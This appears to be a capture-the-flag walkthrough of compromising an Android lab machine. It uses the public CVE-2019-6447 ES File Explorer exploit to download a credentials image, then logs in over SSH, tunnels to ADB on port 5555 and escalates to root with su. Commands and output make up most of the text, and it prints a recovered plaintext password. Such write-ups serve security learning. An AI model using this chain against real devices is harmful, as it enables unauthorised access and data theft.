## Enumeration

As always, I started with a full TCP port scan:

```bash
nmap -p- --min-rate 1000 -T4 <TARGET>
```

Once the open ports were identified, I ran service and default-script enumeration:

```bash
nmap -sC -sV -p <OPEN_PORTS> <TARGET>
```

The interesting results were:

```text
2222/tcp  open  ssh   Banana Studio SSH server app
59777/tcp open  http  Bukkit JSONAPI httpd
```

The service information also gave an important clue:

```text
Service Info: OS: Android
CPE: cpe:/o:linux:linux_kernel
```

At this point, the target immediately became more interesting.

Instead of assuming this was a conventional Linux machine, I had to adjust my enumeration strategy around the fact that the underlying system was **Android**.

The SSH service was running on an unusual port, `2222`, and its banner identified **Banana Studio SSH Server**, which is an Android application rather than a normal OpenSSH installation.

The second service was running HTTP on `59777`.

There was nothing particularly useful to retrieve from the HTTP service directly, so I started looking at the software associated with the exposed Android services.

---

## ES File Explorer

The important breakthrough came from identifying a vulnerability affecting **ES File Explorer**.

The relevant vulnerability is:

**CVE-2019-6447 — ES File Explorer Open Port Vulnerability**

The vulnerable application exposes a network service that can be abused to interact with files on the Android device without requiring normal authentication.

A public proof of concept was available through Exploit-DB:

[Exploit-DB — CVE-2019-6447](https://www.exploit-db.com/exploits/50070?utm_source=chatgpt.com)

The exploit accepts commands such as:

```text
getDeviceInfo
listPics
getFile
```

This was particularly interesting because the vulnerability could potentially turn the HTTP service into an **unauthenticated file-disclosure primitive**.

Before immediately trying to download arbitrary files, I wanted to understand what the service could actually see.

---

## Enumerating the Android device

I started with the device information command:

```bash
python3 50070.py getDeviceInfo <TARGET>
```

The response was:

```text
==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : Standard PC (i440FX + PIIX, 1996)

ftpRoot : /sdcard
ftpPort : 3721
```

The most interesting value here was:

```text
ftpRoot : /sdcard
```

This confirmed that the vulnerable service was interacting with the device's Android storage.

That changes the question from:

> "Can I exploit this service?"

to:

> "What useful information can I retrieve from the filesystem?"

Since credentials, configuration files, SSH keys and other sensitive information are common targets during enumeration, I started looking for files that could potentially contain secrets.

---

## Looking for interesting files

The exploit provides a command specifically for enumerating pictures:

```bash
python3 50070.py listPics <TARGET>
```

The response included:

```text
name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```

One filename immediately stood out:

```text
creds.jpg
```

A file explicitly named `creds` inside a directory accessible through an unauthenticated file service is exactly the kind of artifact worth investigating.

The next step was therefore straightforward: download it.

---

## Retrieving the credentials

Using the `getFile` functionality:

```bash
python3 50070.py getFile \
    <TARGET> \
    /storage/emulated/0/DCIM/creds.jpg
```

The exploit downloaded the file:

```text
[+] Downloading file...
[+] Done. Saved as `out.dat`.
```

After opening the image, I found credentials:

```text
kristi:Kr1sT!5h@Rp3xPl0r3!
```

This gave me a username and password, but I still needed to determine where they could be used.

The obvious candidate was the SSH service discovered during the initial scan.

---

# Initial Access

## SSH

The SSH service was running on port `2222`:

```text
2222/tcp open ssh Banana Studio SSH server
```

So I tried the newly discovered credentials:

```bash
ssh -p 2222 kristi@<TARGET>
```

The server uses an older RSA host-key configuration, so with a modern OpenSSH client I had to explicitly enable the legacy algorithm:

```bash
ssh \
    -o HostKeyAlgorithms=+ssh-rsa \
    -p 2222 \
    kristi@<TARGET>
```

After authentication, I obtained a shell.

At first glance, this looked like a successful foothold. However, the first thing I wanted to establish was **what privileges I actually had**.

---

## Understanding the shell

Running `id`:

```bash
id
```

returned:

```text
uid=10076(u0_a76)
gid=10076(u0_a76)
groups=10076(u0_a76),3003(inet),9997(everybody),
20076(u0_a76_cache),50076(all_a76)

context=u:r:untrusted_app:s0:c76,c256,c512,c768
```

This is an important distinction.

I did **not** have a normal Linux user account with broad filesystem access.

Instead, I was operating as an Android application user:

```text
uid=10076(u0_a76)
```

The SELinux context was also:

```text
u:r:untrusted_app:s0
```

which is consistent with an untrusted Android application context.

So although SSH access had been obtained, this was only the beginning.

The next objective was to enumerate the Android environment from inside the machine.

---

# Local Enumeration

One of the first things I checked was which network services were listening locally:

```bash
ss -tnlp
```

The output contained several interesting listeners:

```text
LISTEN 0 50  *:2222
LISTEN 0 50  [::ffff:192.168.122.155]:36049
LISTEN 0 4   *:5555
LISTEN 0 10  *:42135
LISTEN 0 50  *:59777
LISTEN 0 8   [::ffff:127.0.0.1]:37443
```

The important discovery was:

```text
*:5555
```

Port `5555` immediately stood out because it is commonly associated with **Android Debug Bridge (ADB)**.

This changed the attack path considerably.

I now had:

```text
SSH access
    |
    v
Android application shell
    |
    v
ADB daemon listening on TCP/5555
```

The problem was that the service was not exposed to my attacking machine through the original network scan.

That meant I needed a way to reach the internal service.

---

# Pivoting to ADB

## Why port forwarding?

My SSH session already gave me a connection into the Android device.

The target was listening on:

```text
0.0.0.0:5555
```

from the perspective of the Android environment.

Rather than trying to expose the port through another service, I could use SSH itself to create a tunnel.

The idea is:

```text
Attacker
   |
   | localhost:5555
   |
   | SSH tunnel
   |
   v
Target
   |
   | 127.0.0.1:5555
   |
   v
ADB daemon
```

I established the SSH connection with local port forwarding:

```bash
ssh \
    -L 5555:127.0.0.1:5555 \
    -o HostKeyAlgorithms=+ssh-rsa \
    -p 2222 \
    kristi@<TARGET>
```

Now port `5555` on my attacking machine was effectively connected to port `5555` on the target.

This is a useful technique to remember:

> When a service is reachable from a compromised host but not directly from your machine, an existing SSH connection can often be used to tunnel that service back to you.

---

# ADB Access

With the SSH tunnel established, I connected to the local endpoint using ADB:

```bash
adb connect localhost:5555
```

The important detail is that `localhost` here refers to **my attacking machine**.

The traffic is then carried through the SSH tunnel to the target's ADB daemon.

Once connected, I requested an ADB shell:

```bash
adb shell
```

The resulting shell was different from the SSH shell:

```text
x86_64:/ $ id

uid=2000(shell)
gid=2000(shell)

groups=2000(shell),1004(input),1007(log),1011(adb),
1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),
3002(net_bt),3003(inet),3006(net_bw_stats),
3009(readproc),3011(uhid)

context=u:r:shell:s0
```

This was another privilege transition.

The SSH shell had been:

```text
uid=10076(u0_a76)
context=u:r:untrusted_app:s0
```

while the ADB shell was:

```text
uid=2000(shell)
context=u:r:shell:s0
```

The ADB interface therefore gave me a more privileged Android execution context.

But I still wasn't root.

---

# Root

The final step was surprisingly simple.

From the ADB shell:

```bash
su
```

The shell prompt changed, and running `id` confirmed full privileges:

```bash
id
```

```text
uid=0(root)
gid=0(root)
groups=0(root)
context=u:r:su:s0
```
